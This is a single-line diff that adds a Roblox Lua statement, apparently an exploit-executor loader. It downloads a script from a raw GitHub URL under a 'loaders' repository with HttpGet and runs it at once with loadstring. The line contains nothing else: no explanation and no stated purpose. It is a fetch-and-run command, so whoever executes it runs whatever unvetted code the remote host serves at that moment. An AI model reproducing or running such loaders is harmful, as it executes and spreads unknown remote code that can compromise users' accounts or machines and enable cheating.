@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/kukirin-life-testing-spam5-t0tgi94qn629h1.lua"))()
